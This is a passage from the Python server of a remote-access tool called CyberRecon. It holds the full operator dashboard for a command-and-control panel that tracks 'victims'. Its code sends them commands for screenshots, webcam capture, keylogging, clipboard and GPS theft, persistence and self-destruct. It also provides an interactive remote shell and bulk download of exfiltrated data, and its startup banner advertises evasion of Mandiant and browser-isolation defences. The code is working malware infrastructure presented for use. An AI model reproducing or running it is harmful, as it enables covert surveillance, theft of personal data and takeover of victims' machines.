    margin-top:6px;
  }

  /* ── Metrics ───────────────────────────── */
  .metrics{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:16px;margin-bottom:22px}
  .metric{
    background:var(--card);border:1px solid var(--border);border-radius:16px;
    padding:18px 18px 20px; position:relative; overflow:hidden;
    box-shadow:var(--shadow);
    transition:transform .18s, box-shadow .18s;
  }
  .metric:hover{transform:translateY(-3px);box-shadow:var(--shadow-lg)}
  .metric::after{
    content:"";position:absolute;left:0;right:0;bottom:0;height:4px;
    background:var(--accent,var(--violet));
  }
  .metric-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
  .metric-icon{
    width:38px;height:38px;border-radius:11px;display:grid;place-items:center;
    font-size:18px;background:color-mix(in srgb, var(--accent) 14%, transparent);
  }
  .metric-value{font-size:29px;font-weight:800;letter-spacing:-1px;line-height:1;font-variant-numeric:tabular-nums}
  .metric-label{font-size:11.5px;color:var(--muted);margin-top:7px;font-weight:600;letter-spacing:.3px}

  /* ── Panels ────────────────────────────── */
  .grid{display:grid;grid-template-columns:2fr 1fr;gap:18px}
  .panel{
    background:var(--card);border:1px solid var(--border);border-radius:16px;
    padding:20px; box-shadow:var(--shadow);
  }
  .panel-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
  .panel-title{font-size:14px;font-weight:700}
  .panel-title span{color:var(--muted);font-weight:500;font-size:12px;margin-left:8px}
  .chip{
    font-size:11px;font-weight:650;padding:4px 11px;border-radius:20px;
    background:color-mix(in srgb, var(--cyan) 14%, transparent);color:#0891b2;
  }

  /* chart */
  .chart{height:210px;display:flex;align-items:flex-end;gap:9px;padding-top:10px}
  .bar{
    flex:1;border-radius:8px 8px 4px 4px;min-height:8px;
    background:var(--grad); opacity:.85;
    transition:opacity .2s, transform .2s;
  }
  .bar:hover{opacity:1;transform:scaleY(1.03)}

  /* feed */
  .feed{display:flex;flex-direction:column;gap:14px;max-height:260px;overflow-y:auto}
  .feed-item{display:flex;gap:12px;align-items:flex-start}
  .feed-dot{
    width:9px;height:9px;border-radius:50%;margin-top:5px;flex-shrink:0;
    box-shadow:0 0 0 3px color-mix(in srgb, currentColor 18%, transparent);
  }
  .feed-body{flex:1;min-width:0}
  .feed-text{font-size:12.8px;line-height:1.45}
  .feed-time{font-size:11px;color:var(--muted);margin-top:3px;font-family:'JetBrains Mono',monospace}

  /* table */
  .table{width:100%;border-collapse:collapse;font-size:13px}
  .table th{
    text-align:left;font-size:10.5px;letter-spacing:.9px;text-transform:uppercase;
    color:var(--muted);font-weight:700;padding:0 12px 12px;
  }
  .table td{padding:13px 12px;border-top:1px solid var(--border)}
  .table tbody tr{transition:background .15s;cursor:pointer}
  .table tbody tr:hover{background:color-mix(in srgb, var(--violet) 5%, transparent)}
  .pill{font-size:11px;font-weight:650;padding:4px 11px;border-radius:20px;display:inline-block}
  .pill.ok{background:rgba(16,185,129,.14);color:#059669}
  .pill.warn{background:rgba(245,158,11,.16);color:#b45309}
  .pill.info{background:rgba(6,182,212,.14);color:#0891b2}
  .pill.err{background:rgba(244,63,94,.14);color:#dc2626}
  .mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted)}

  /* console */
  .console{
    background:#0d1224;border-radius:12px;padding:16px;height:200px;overflow-y:auto;
    font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.85;color:#a5b4d4;
  }
  .console .ok{color:#34d399}
  .console .warn{color:#fbbf24}
  .console .err{color:#fb7185}
  .console .info{color:#67e8f9}
  .console .time{color:#475569}

  /* exfil panel */
  .panel-img{
    width:100%; border-radius:12px; display:block; background:#0d1224;
    min-height:200px; object-fit:contain;
  }
  .panel-img-wrap{
    background:#0d1224; border-radius:12px; min-height:200px;
    display:flex; align-items:center; justify-content:center;
    color:var(--muted); font-size:12px;
  }
  .panel-pre{
    background:#0d1224; border-radius:12px; padding:14px;
    font-family:'JetBrains Mono',monospace; font-size:11.5px;
    color:#a5b4d4; white-space:pre-wrap; word-break:break-all;
    max-height:240px; overflow-y:auto; margin:0;
  }
  .shell-input-bar{display:flex;gap:8px;margin-bottom:12px;align-items:center}
  .shell-input-bar span{font-family:'JetBrains Mono',monospace;color:var(--emerald);font-size:14px}
  .shell-input-bar input{
    flex:1; padding:10px 12px; background:var(--bg);
    border:1px solid var(--border); border-radius:10px;
    color:var(--text); font-family:'JetBrains Mono',monospace;
    font-size:12.5px; outline:none;
  }

  .full{grid-column:1/-1}

  @media(max-width:1000px){
    .shell{grid-template-columns:1fr}
    .sidebar{position:static}
    .grid{grid-template-columns:1fr}
  }
</style>
</head>
<body>

<header class="topbar">
  <div class="brand">
    <div class="brand-mark">⚡</div>
    <div>
      <div class="brand-name">CyberRecon</div>
      <div class="brand-sub">Command Center</div>
    </div>
  </div>
  <div class="search">
    <span style="color:var(--muted)">⌕</span>
    <input id="search-input" placeholder="Search victims…">
  </div>
  <div class="top-actions">
    <button class="icon-btn" id="themeBtn" title="Toggle theme">🌙</button>
    <a href="/logout" class="icon-btn" title="Logout" style="text-decoration:none">⏻</a>
    <div class="avatar">OP</div>
  </div>
</header>

<div class="shell">

  <aside class="sidebar">
    <div class="nav-label">Targets</div>
    <select class="victim-select" id="victim-select">
      <option value="">— Select victim —</option>
    </select>
    <div class="command-row">
      <select id="cmd-select">
        <option value="screenshot">📸 Screenshot</option>
        <option value="webcam_snap">📷 Webcam</option>
        <option value="keylog_start">⌨️ Keylog Start</option>
        <option value="keylog_stop">⌨️ Keylog Stop</option>
        <option value="clipboard_get">📋 Clipboard</option>
        <option value="gps_locate">📍 GPS Locate</option>
        <option value="process_list">⚙️ Process List</option>
        <option value="system_info">💻 System Info</option>
        <option value="whoami">👤 Whoami</option>
        <option value="persist">🔒 Persist</option>
      </select>
      <button class="btn-primary" id="send-btn">SEND</button>
    </div>
    <button class="btn-danger" id="destruct-btn">💀 SELF DESTRUCT</button>
    <button class="btn-download" id="download-btn">⬇ DOWNLOAD ALL</button>

    <div class="nav-label" style="margin-top:16px">Session</div>
    <div class="nav-item active"><span class="dot"></span> Live Feed</div>
    <div class="nav-item"><span class="dot"></span> Victims <span class="badge" id="victim-count-badge">0</span></div>
    <div class="nav-item"><span class="dot"></span> Events</div>
  </aside>

  <main>
    <div class="metrics">
      <div class="metric" style="--accent:var(--violet)">
        <div class="metric-top">
          <div class="metric-icon">🎯</div>
        </div>
        <div class="metric-value" id="m-victims">0</div>
        <div class="metric-label">Active Victims</div>
      </div>
      <div class="metric" style="--accent:var(--cyan)">
        <div class="metric-top">
          <div class="metric-icon">⚡</div>
        </div>
        <div class="metric-value" id="m-exfil">0</div>
        <div class="metric-label">Exfil Events</div>
      </div>
      <div class="metric" style="--accent:var(--amber)">
        <div class="metric-top">
          <div class="metric-icon">📸</div>
        </div>
        <div class="metric-value" id="m-screenshots">0</div>
        <div class="metric-label">Screenshots</div>
      </div>
      <div class="metric" style="--accent:var(--emerald)">
        <div class="metric-top">
          <div class="metric-icon">📷</div>
        </div>
        <div class="metric-value" id="m-webcam">0</div>
        <div class="metric-label">Webcam Captures</div>
      </div>
      <div class="metric" style="--accent:var(--pink)">
        <div class="metric-top">
          <div class="metric-icon">⌨️</div>
        </div>
        <div class="metric-value" id="m-keystrokes">0</div>
        <div class="metric-label">Keystroke Chunks</div>
      </div>
    </div>

    <div class="grid">
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title">Exfil Activity <span>per victim</span></div>
          <div class="chip">Live</div>
        </div>
        <div class="chart" id="chart"></div>
      </div>

      <div class="panel">
        <div class="panel-head"><div class="panel-title">Recent Events</div></div>
        <div class="feed" id="feed"></div>
      </div>

      <div class="panel full">
        <div class="panel-head">
          <div class="panel-title">Victims <span id="victims-count-span">0 registered</span></div>
          <div class="chip">Auto-refresh</div>
        </div>
        <table class="table">
          <thead>
            <tr><th>Hostname</th><th>User</th><th>IP</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Exfil</th></tr>
          </thead>
          <tbody id="victims-tbody">
            <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">Waiting for victims…</td></tr>
          </tbody>
        </table>
      </div>

      <div class="panel">
        <div class="panel-head">
          <div class="panel-title">Latest Screenshot</div>
          <div class="chip" id="screenshot-ts">—</div>
        </div>
        <div class="panel-img-wrap" id="screenshot-panel">No screenshot yet</div>
      </div>

      <div class="panel">
        <div class="panel-head">
          <div class="panel-title">Latest Webcam</div>
          <div class="chip" id="webcam-ts">—</div>
        </div>
        <div class="panel-img-wrap" id="webcam-panel">No webcam capture yet</div>
      </div>

      <div class="panel">
        <div class="panel-head">
          <div class="panel-title">GPS Location</div>
          <div class="chip" id="gps-ts">—</div>
        </div>
        <div class="panel-img-wrap" id="gps-panel" style="min-height:200px">No GPS data yet</div>
      </div>

      <div class="panel">
        <div class="panel-head">
          <div class="panel-title">Command Output</div>
        </div>
        <pre class="panel-pre" id="output-panel">whoami / system_info / process_list results appear here…</pre>
      </div>

      <div class="panel full">
        <div class="panel-head">
          <div class="panel-title">Interactive Shell</div>
        </div>
        <div class="shell-input-bar">
          <span>$</span>
          <input type="text" id="shell-input" placeholder="Type a command (e.g. whoami, ipconfig, dir &quot;C:\\&quot;)" autocomplete="off" spellcheck="false">
          <button class="btn-primary" id="shell-exec-btn">EXECUTE</button>
        </div>
        <pre class="panel-pre" id="shell-output" style="min-height:140px">No commands run yet.</pre>
      </div>

      <div class="panel full">
        <div class="panel-head">
          <div class="panel-title">Console</div>
          <div class="chip">tail -f</div>
        </div>
        <div class="console" id="console"></div>
      </div>

      <div class="panel full">
        <div class="panel-head">
          <div class="panel-title">Keystrokes</div>
        </div>
        <pre class="panel-pre" id="keystrokes-panel" style="min-height:120px">No keystrokes captured yet</pre>
      </div>
    </div>
  </main>
</div>

<script>
  const OPERATOR_TOKEN = "__OPERATOR_TOKEN__";
  let selectedVictim = null;
  let victims = {};
  let lastTs = { screenshot: null, webcam: null, gps: null, output: null };
  let lastKeystrokesCount = 0;

  // ── Theme ────────────────────────────────
  const root = document.documentElement;
  const themeBtn = document.getElementById('themeBtn');
  themeBtn.onclick = () => {
    const dark = root.dataset.theme === 'dark';
    root.dataset.theme = dark ? 'light' : 'dark';
    themeBtn.textContent = dark ? '🌙' : '☀️';
  };

  // ── Console log ──────────────────────────
  const consoleEl = document.getElementById('console');
  function consoleLog(level, msg) {
    const d = document.createElement('div');
    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
    const cls = (level === 'ok' || level === 'warn' || level === 'err' || level === 'info') ? level : 'info';
    d.innerHTML = `<span class="time">${ts}</span> <span class="${cls}">${cls === 'ok' ? '✓' : cls === 'warn' ? '!' : cls === 'err' ? '✗' : '›'}</span> ${msg}`;
    consoleEl.appendChild(d);
    consoleEl.scrollTop = consoleEl.scrollHeight;
    while (consoleEl.children.length > 200) consoleEl.removeChild(consoleEl.firstChild);
  }

  // ── Render victims table ────────────────
  function renderVictims() {
    const tbody = document.getElementById('victims-tbody');
    const arr = Object.values(victims);
    document.getElementById('victims-count-span').textContent = `${arr.length} registered`;
    document.getElementById('victim-count-badge').textContent = arr.length;

    if (arr.length === 0) {
      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">Waiting for victims…</td></tr>';
      return;
    }
    tbody.innerHTML = '';
    arr.forEach(v => {
      const tr = document.createElement('tr');
      const ago = Math.round(Date.now() / 1000 - v.last_seen);
      const agoStr = ago < 60 ? `${ago}s ago` : ago < 3600 ? `${Math.floor(ago/60)}m ago` : `${Math.floor(ago/3600)}h ago`;
      const statusPill = v.status === 'online'
        ? '<span class="pill ok">Online</span>'
        : '<span class="pill err">Offline</span>';
      tr.innerHTML = `
        <td><b>${v.hostname}</b></td>
        <td>${v.user}</td>
        <td class="mono">${v.ip}</td>
        <td class="mono">${v.os}</td>
        <td>${statusPill}</td>
        <td class="mono">${agoStr}</td>
        <td class="mono">${v.exfil_count}</td>
      `;
      tr.onclick = () => {
        selectedVictim = v.id;
        document.getElementById('victim-select').value = v.id;
        consoleLog('info', `Selected: ${v.hostname} (${v.id.slice(0,8)}…)`);
        refreshExfil();
      };
      tbody.appendChild(tr);
    });
  }

  // ── Chart ────────────────────────────────
  function renderChart() {
    const chart = document.getElementById('chart');
    const arr = Object.values(victims);
    chart.innerHTML = '';
    if (arr.length === 0) {
      chart.innerHTML = '<div style="width:100%;text-align:center;color:var(--muted);font-size:12px;padding:40px 0">No data yet</div>';
      return;
    }
    const max = Math.max(1, ...arr.map(v => v.exfil_count));
    arr.slice(0, 14).forEach(v => {
      const bar = document.createElement('div');
      bar.className = 'bar';
      bar.style.height = Math.max(8, (v.exfil_count / max) * 100) + '%';
      bar.title = `${v.hostname}: ${v.exfil_count} events`;
      chart.appendChild(bar);
    });
  }

  // ── Feed ─────────────────────────────────
  async function refreshEvents() {
    try {
      const resp = await fetch('/events?t=' + Date.now());
      if (!resp.ok) return;
      const data = await resp.json();
      const feed = document.getElementById('feed');
      const evs = (data.events || []).slice(-8).reverse();
      feed.innerHTML = '';
      if (evs.length === 0) {
        feed.innerHTML = '<div style="color:var(--muted);font-size:12px">No events yet</div>';
        return;
      }
      evs.forEach(e => {
        const d = document.createElement('div');
        d.className = 'feed-item';
        const color = e.level === 'ok' ? 'var(--emerald)'
                    : e.level === 'warn' ? 'var(--amber)'
                    : e.level === 'err' ? 'var(--rose)'
                    : 'var(--cyan)';
        const ago = Math.round(Date.now() / 1000 - e.ts);
        const agoStr = ago < 60 ? `${ago}s ago` : `${Math.floor(ago/60)}m ago`;
        d.innerHTML = `
          <span class="feed-dot" style="color:${color};background:${color}"></span>
          <div class="feed-body">
            <div class="feed-text">${e.msg}</div>
            <div class="feed-time">${agoStr}</div>
          </div>`;
        feed.appendChild(d);
      });
    } catch (e) { /* ignore */ }
  }

  // ── Refresh victims ──────────────────────
  async function refreshVictims() {
    try {
      const resp = await fetch('/victims?t=' + Date.now());
      if (resp.status === 401) {
        consoleLog('err', 'Session expired — redirecting');
        setTimeout(() => window.location.href = '/login', 800);
        return;
      }
      const data = await resp.json();
      victims = {};
      data.victims.forEach(v => { victims[v.id] = v; });

      document.getElementById('m-victims').textContent = data.count;
      document.getElementById('m-exfil').textContent =
        data.victims.reduce((s, v) => s + v.exfil_count, 0);
      document.getElementById('m-screenshots').textContent =
        data.victims.reduce((s, v) => s + v.screenshots_count, 0);
      document.getElementById('m-webcam').textContent =
        data.victims.reduce((s, v) => s + v.webcam_count, 0);
      document.getElementById('m-keystrokes').textContent =
        data.victims.reduce((s, v) => s + v.keystrokes_count, 0);

      // Update victim selector
      const sel = document.getElementById('victim-select');
      const cur = sel.value;
      sel.innerHTML = '<option value="">— Select victim —</option>';
      data.victims.forEach(v => {
        const opt = document.createElement('option');
        opt.value = v.id;
        opt.textContent = `${v.hostname} (${v.status})`;
        sel.appendChild(opt);
      });
      if (cur && victims[cur]) sel.value = cur;
      if (!selectedVictim && data.victims.length > 0) {
        selectedVictim = data.victims[0].id;
        sel.value = selectedVictim;
      }

      // Auto-deselect if gone
      if (selectedVictim && !victims[selectedVictim]) {
        consoleLog('warn', `Victim ${selectedVictim.slice(0,8)}… disappeared`);
        selectedVictim = null;
        resetExfilPanels();
      }

      renderVictims();
      renderChart();
      if (selectedVictim) refreshExfil();
    } catch (e) { /* ignore */ }
  }

  // ── Exfil data refresh ───────────────────
  function resetExfilPanels() {
    lastTs = { screenshot: null, webcam: null, gps: null, output: null };
    document.getElementById('screenshot-panel').innerHTML = 'No screenshot yet';
    document.getElementById('webcam-panel').innerHTML = 'No webcam capture yet';
    document.getElementById('gps-panel').innerHTML = 'No GPS data yet';
    document.getElementById('output-panel').textContent = 'whoami / system_info / process_list results appear here…';
    document.getElementById('keystrokes-panel').textContent = 'No keystrokes captured yet';
    document.getElementById('screenshot-ts').textContent = '—';
    document.getElementById('webcam-ts').textContent = '—';
    document.getElementById('gps-ts').textContent = '—';
  }

  async function refreshExfil() {
    if (!selectedVictim) return;
    try {
      const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
      if (resp.status === 404) {
        selectedVictim = null;
        resetExfilPanels();
        return;
      }
      if (!resp.ok) return;
      const data = await resp.json();

      // Screenshot
      const ss = data.screenshots || [];
      if (ss.length) {
        const last = ss[ss.length - 1];
        if (last.ts !== lastTs.screenshot) {
          lastTs.screenshot = last.ts;
          const url = `/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
          const el = document.getElementById('screenshot-panel');
          el.innerHTML = '';
          const img = document.createElement('img');
          img.className = 'panel-img';
          img.src = url;
          img.onerror = () => { el.innerHTML = 'Screenshot not an image'; };
          el.appendChild(img);
          document.getElementById('screenshot-ts').textContent = new Date(last.ts).toLocaleTimeString();
          consoleLog('ok', `Screenshot received from ${selectedVictim.slice(0,8)}…`);
        }
      }

      // Webcam
      const wc = data.webcam || [];
      if (wc.length) {
        const last = wc[wc.length - 1];
        if (last.ts !== lastTs.webcam) {
          lastTs.webcam = last.ts;
          const url = `/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
          const el = document.getElementById('webcam-panel');
          el.innerHTML = '';
          const img = document.createElement('img');
          img.className = 'panel-img';
          img.src = url;
          img.onerror = () => { el.innerHTML = 'No camera on victim'; };
          el.appendChild(img);
          document.getElementById('webcam-ts').textContent = new Date(last.ts).toLocaleTimeString();
          consoleLog('ok', `Webcam capture received`);
        }
      }

      // Keystrokes
      const kl = data.keystrokes || [];
      if (kl.length !== lastKeystrokesCount) {
        lastKeystrokesCount = kl.length;
        let txt = '';
        kl.forEach(k => { txt += k.data; });
        document.getElementById('keystrokes-panel').textContent = txt || 'No keystrokes captured yet';
      }

      // GPS
      const locs = data.locations || [];
      if (locs.length) {
        const last = locs[locs.length - 1];
        if (last.ts !== lastTs.gps) {
          lastTs.gps = last.ts;
          renderGPS(last.data);
          document.getElementById('gps-ts').textContent = new Date(last.ts).toLocaleTimeString();
          consoleLog('ok', `GPS received`);
        }
      }

      // Outputs
      const outs = data.outputs || [];
      if (outs.length) {
        const last = outs[outs.length - 1];
        if (last.ts !== lastTs.output) {
          lastTs.output = last.ts;
          const body = typeof last.data === 'object'
            ? JSON.stringify(last.data, null, 2)
            : String(last.data);
          if (last.type === 'shell') {
            const so = document.getElementById('shell-output');
            if (so.textContent === 'No commands run yet.') so.textContent = '';
            so.textContent += body.endsWith('\n') ? body : body + '\n';
            so.scrollTop = so.scrollHeight;
          } else {
            document.getElementById('output-panel').textContent =
              `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n${body}`;
          }
          consoleLog('ok', `Output: ${last.type}`);
        }
      }
    } catch (e) { /* ignore */ }
  }

  function renderGPS(loc) {
    if (typeof loc === 'string') { try { loc = JSON.parse(loc); } catch(e) { return; } }
    const lat = parseFloat(loc.latitude);
    const lon = parseFloat(loc.longitude);
    const el = document.getElementById('gps-panel');
    if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
      el.innerHTML = `<div style="padding:14px;color:var(--muted);font-size:12px">${loc.error || 'Location unavailable'}</div>`;
      return;
    }
    const d = 0.01;
    const bbox = `${(lon-d).toFixed(6)},${(lat-d).toFixed(6)},${(lon+d).toFixed(6)},${(lat+d).toFixed(6)}`;
    const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
    el.innerHTML = `
      <div style="width:100%">
        <div style="padding:10px;font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:var(--emerald)">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
        <div style="padding:0 10px 10px;font-size:11.5px;color:var(--muted)">📍 ${loc.source || 'unknown'}</div>
        <iframe src="${mapUrl}" style="width:100%;height:180px;border:0;border-radius:0 0 12px 12px;display:block" loading="lazy"></iframe>
      </div>`;
  }

  // ── Command send ─────────────────────────
  async function sendCommand(cmdName) {
    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
    try {
      const resp = await fetch(`/command/${selectedVictim}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Operator-Token': OPERATOR_TOKEN
        },
        body: JSON.stringify({ command: cmdName })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
      consoleLog('info', `Command queued: ${cmdName}`);
    } catch (e) {
      consoleLog('err', `Command failed: ${e.message}`);
    }
  }

  // ── Shell send ───────────────────────────
  async function sendShell() {
    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
    const input = document.getElementById('shell-input');
    const out = document.getElementById('shell-output');
    const raw = input.value.trim();
    if (!raw) return;
    if (out.textContent === 'No commands run yet.') out.textContent = '';
    out.textContent += `$ ${raw}\n`;
    out.scrollTop = out.scrollHeight;
    try {
      const resp = await fetch(`/shell/${selectedVictim}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Operator-Token': OPERATOR_TOKEN
        },
        body: JSON.stringify({ command: raw })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
      consoleLog('info', `Shell queued: ${raw}`);
      input.value = '';
    } catch (e) {
      out.textContent += `[ERROR] ${e.message}\n`;
      out.scrollTop = out.scrollHeight;
      consoleLog('err', `Shell failed: ${e.message}`);
    }
  }

  // ── Wire up buttons ──────────────────────
  document.getElementById('send-btn').onclick = () => {
    sendCommand(document.getElementById('cmd-select').value);
  };
  document.getElementById('destruct-btn').onclick = () => {
    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
    if (confirm('Send SELF DESTRUCT to this victim?')) {
      sendCommand('self_destruct');
    }
  };
  document.getElementById('download-btn').onclick = () => {
    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
    fetch(`/download-all/${selectedVictim}?t=${Date.now()}`, {
      headers: { 'X-Operator-Token': OPERATOR_TOKEN }
    }).then(async r => {
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const blob = await r.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `CyberRecon_${selectedVictim}.zip`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      consoleLog('ok', 'Data downloaded');
    }).catch(e => consoleLog('err', `Download failed: ${e.message}`));
  };
  document.getElementById('shell-exec-btn').onclick = sendShell;
  document.getElementById('shell-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') { e.preventDefault(); sendShell(); }
  });
  document.getElementById('victim-select').addEventListener('change', e => {
    selectedVictim = e.target.value || null;
    resetExfilPanels();
    if (selectedVictim) {
      consoleLog('info', `Selected: ${victims[selectedVictim]?.hostname || 'unknown'}`);
      refreshExfil();
    }
  });
  document.getElementById('search-input').addEventListener('input', e => {
    const q = e.target.value.toLowerCase();
    document.querySelectorAll('#victims-tbody tr').forEach(tr => {
      tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
    });
  });

  // ── Main poll loop ───────────────────────
  refreshVictims();
  refreshEvents();
  setInterval(refreshVictims, 3000);
  setInterval(refreshEvents, 5000);
  setInterval(() => { if (selectedVictim) refreshExfil(); }, 2500);
  consoleLog('info', 'Command Center initialized');
</script>
</body>
</html>
"""


@app.route("/dashboard")
@require_dashboard_login
def dashboard():
    html = DASHBOARD_HTML.replace("__OPERATOR_TOKEN__", OPERATOR_TOKEN or "")
    return render_template_string(html)


if __name__ == "__main__":
    load_victims()
    print("=" * 60)
    print("  ⚡ CyberRecon Command Center v3.6.0 (NOVA GUI)")
    print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
    print("=" * 60)
    print(f"  Operator auth: {'ON' if REQUIRE_AUTH else 'OFF'}")
    print(f"  Victim auth:   {'ON' if REQUIRE_VICTIM_KEY else 'OFF'}")
    print(f"  QR encryption: {'AES-256-GCM' if _aesgcm else 'PLAINTEXT (set CYBERRECON_KEY in .env)'}")
    print(f"  Dashboard auth:{' ON (password required)' if DASHBOARD_PASSWORD else ' OFF (!! set CYBERRECON_DASHBOARD_PASSWORD !!)'}")
    print("=" * 60)

    if not C2_KEY:
        print("[!] WARNING: CYBERRECON_KEY missing — QR payloads are plaintext.")
    if _aesgcm is None and C2_KEY:
        print("[!] WARNING: CYBERRECON_KEY present but failed to load (must be 44 base64url chars).")
    if not DASHBOARD_PASSWORD:
        print("[!] WARNING: CYBERRECON_DASHBOARD_PASSWORD not set — dashboard login disabled!")

    ssl_ctx = None
    if os.path.exists("cert.pem") and os.path.exists("key.pem"):
        ssl_ctx = ("cert.pem", "key.pem")
        print("  TLS:           ENABLED (self-signed)")
    else:
        print("  TLS:           DISABLED (no cert.pem/key.pem)")
        print("[!] WARNING: client .env must use http:// if TLS is off.")

    print("=" * 60)
    scheme = "https" if ssl_ctx else "http"
    print(f"  REST API:    {scheme}://0.0.0.0:8443")
    print(f"  Dashboard:   {scheme}://0.0.0.0:8443/dashboard  (login required)")
    print("=" * 60)

    try:
        app.run(host="0.0.0.0", port=8443, debug=False,
                threaded=True, ssl_context=ssl_ctx)
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
